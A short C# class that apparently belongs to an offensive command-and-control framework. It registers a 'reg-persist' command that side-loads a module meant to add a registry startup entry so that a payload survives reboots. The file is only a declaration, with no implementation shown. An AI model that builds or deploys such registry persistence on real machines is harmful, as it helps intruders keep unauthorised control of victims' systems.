using Commander.Commands.SideLoad;
using Commander.Communication;
using Commander.Executor;
using Commander.Terminal;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Commands.Module
{
    public class RegKeyPersistenceCommand : SiteLoadModuleCommand
    {
        public override string Description => "Site load a dll adding an entry in the registry to run as startup";
        public override string Name => "reg-persist";
        public override string ModuleName => "RegKeyPersistence.exe";

    }
}
